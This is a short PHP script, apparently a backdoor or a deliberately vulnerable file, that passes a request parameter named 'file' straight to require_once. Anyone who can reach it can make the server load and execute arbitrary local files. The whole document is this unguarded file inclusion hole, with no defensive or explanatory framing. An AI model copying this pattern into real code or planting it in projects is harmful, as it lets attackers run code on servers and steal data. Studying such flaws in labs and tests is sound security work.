<?php 
  if(isset($_REQUEST['file'])) 
  if(is_file($_REQUEST['file'])) require_once($_REQUEST['file']);
?>
